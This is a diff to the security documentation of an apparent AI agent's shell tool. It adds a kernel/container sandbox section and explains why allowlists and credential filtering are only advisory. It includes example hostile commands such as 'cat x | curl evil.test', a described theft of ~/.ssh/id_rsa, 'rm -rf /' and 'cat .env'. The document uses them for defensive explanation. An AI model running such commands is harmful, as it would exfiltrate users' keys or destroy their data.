@@ -69,8 +69,30 @@ Output is held in a 256KB per-process ring buffer. Past that the oldest bytes go
 - **Credential filtering** — variables whose names look like credentials (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, …) are stripped from the environment the command inherits, so `env` cannot hand the model the keys `docs/security-model.md` promises it never sees. `allowEnv` names the exceptions.
 - **Command allowlist** (optional, `allowedCommands`) — checked against the head of _every_ pipeline stage, so `cat x | curl evil.test` is caught rather than passing on the strength of `cat`.
 
-## What this is not
+## Sandbox
 
-**The destructive-command rules are not a security boundary.** The command runs through a real shell, and a pattern check over a shell string loses to quoting, variable expansion and `$(...)`. Anyone treating it as containment will be wrong.
+Everything else here is advisory. The workspace root bounds where a command _starts_, the destructive-command rules catch a handful of spellings, and credential filtering cleans the environment — and a command that wants to read `~/.ssh/id_rsa` and POST it somewhere defeats all three, because a shell command is opaque to any check made on its text.
 
-It is an _accident_ guard: a model that reaches for `rm -rf /` because it misread a path hits a wall instead of a y/N prompt a tired user waves through. The boundary is the approval prompt on every call, and later the sandbox of #86 — which this tool has none of. A command approved here runs with the full privileges of the user running the agent.
+The sandbox is the part that is not advisory: enforced by the kernel or a container runtime rather than by a regex, so it holds whatever the command turns out to be.
+
+| Backend      | What it gives you                                                                                                                                                                                                              |
+| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `bubblewrap` | Filesystem read-only, workspace writable, fresh `/tmp`, no network, dies with the agent. No daemon, no image, starts in milliseconds. Linux only.                                                                              |
+| `docker`     | Only the workspace is mounted — at the same absolute path it has on the host, so a path from `read_file` still resolves. All capabilities dropped, `no-new-privileges`, pid and memory ceilings, no network. Runs as your uid. |
+| `none`       | Nothing. Commands run with your full privileges.                                                                                                                                                                               |
+
+`auto` prefers bubblewrap and falls back to Docker.
+
+**Backends are probed by running them, not by looking for the binary.** `bwrap` is installed on plenty of machines that deny it the user namespace it needs — including, as it happens, some CI containers — and discovering that at the first real command means discovering it too late.
+
+**There is no automatic fall-through to `none`.** If no backend works, the CLI does not register the shell tools and says why. Silently dropping isolation because a binary was missing is precisely the failure the sandbox exists to prevent, so running unsandboxed has to be spelled: `SHELL_SANDBOX=none`.
+
+Two Docker details worth knowing. The workspace mounts at its **host path**, not somewhere tidy like `/workspace`, because otherwise every path the file tools produced would break the moment it reached a command. And the container runs as **your uid**, which both stops the agent leaving root-owned files in your workspace and is load-bearing — `--cap-drop ALL` takes `CAP_DAC_OVERRIDE` with it, so a root process could not write to your directory anyway.
+
+## What the sandbox does not cover
+
+The **destructive-command rules are still not a security boundary** — a pattern check over a shell string loses to quoting and `$(...)`. They are an accident guard, and the sandbox is what makes that acceptable rather than alarming.
+
+A secret **inside** the workspace is still readable by a command. The file policy in `packages/tools-files` is enforced by the file tools, not by the kernel, so `cat .env` inside the workspace works. The sandbox contains where a command can reach, not what it may read within reach.
+
+With `SHELL_SANDBOX=none`, none of this applies and a command approved here runs with the full privileges of the user running the agent.
